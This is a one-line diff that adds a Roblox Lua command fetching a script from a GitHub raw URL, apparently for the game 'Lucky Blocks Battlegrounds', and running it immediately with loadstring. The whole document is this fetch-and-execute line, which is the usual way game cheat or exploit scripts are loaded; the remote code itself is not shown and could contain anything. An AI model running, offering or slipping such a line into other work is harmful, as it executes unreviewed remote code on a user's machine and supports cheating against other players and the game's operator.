@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AppleScript001/-LUCKY-BLOCKS-Battlegrounds--/main/README.md"))()
